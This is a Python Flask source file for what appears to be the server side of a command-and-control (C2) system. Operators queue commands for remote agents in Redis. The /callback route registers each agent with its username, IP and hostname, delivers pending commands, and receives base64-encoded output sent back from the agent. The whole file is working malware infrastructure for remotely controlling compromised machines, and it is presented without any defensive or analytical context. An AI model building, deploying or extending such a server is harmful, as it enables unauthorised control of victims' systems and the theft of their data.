from flask import Flask, request
from functions import *
import base64


app = Flask(__name__)

@app.route('/admin', methods=['POST'])
def send_command():
    data = request.json
    if request.method == 'POST':
        uuid = data.get('uuid')
        cmd = data.get('command')
        r.rpush(uuid, cmd)
        if r.llen(uuid) > 100:
            r.lpop(uuid)
    return "Command Sent!"

@app.route('/callback', methods=['GET', 'POST'])
def commander():
    if request.method == 'GET':
        b64uuid = base64.b64decode(request.args.get("uuid"))
        b64user = base64.b64decode(request.args.get("user"))

        uuid = b64uuid.decode('utf-8')
        profile = request.headers.get("Sec-Purpose")
        hostname = request.headers.get("X-Forwarded-Host")
        ip = request.headers.get("X-Real-IP")
        user = b64user.decode('utf-8')

        if r.exists(uuid) == 0:
            register_agent(uuid, profile, ip, hostname, user)
            send = {"data": "", "param": ""}
            return send

        cache = r.lindex(uuid, -1)
        if "SEEN" in cache or "AGENT REGISTERED" in cache:
            update_seen(uuid)
            send = send = {"data": "", "param": ""}
        else:
            cmd = cache.split(' ', 1)
            if len(cmd) > 1:
                param = cmd[1]
            else:
                param = ""
            update_seen(uuid)
            r.rpush(uuid, "SEEN")
            small_check(uuid)
            send = {"data": cmd[0], "param": param}
        return send

    elif request.method == 'POST':
        data = request.json
        b64data = base64.b64decode(data.get("data"))
        b64uuid = base64.b64decode(data.get("uuid"))

        uuid = b64uuid.decode('utf-8')
        data = b64data.decode('utf-8')
        if uuid and data:
            key = f"{uuid}-output"
            r.publish(key, data)
        return "Success"
    else:
        return "Invalid Method"


# This allows you to run the app directly with `python app.py`
if __name__ == '__main__':
    app.run(debug=True)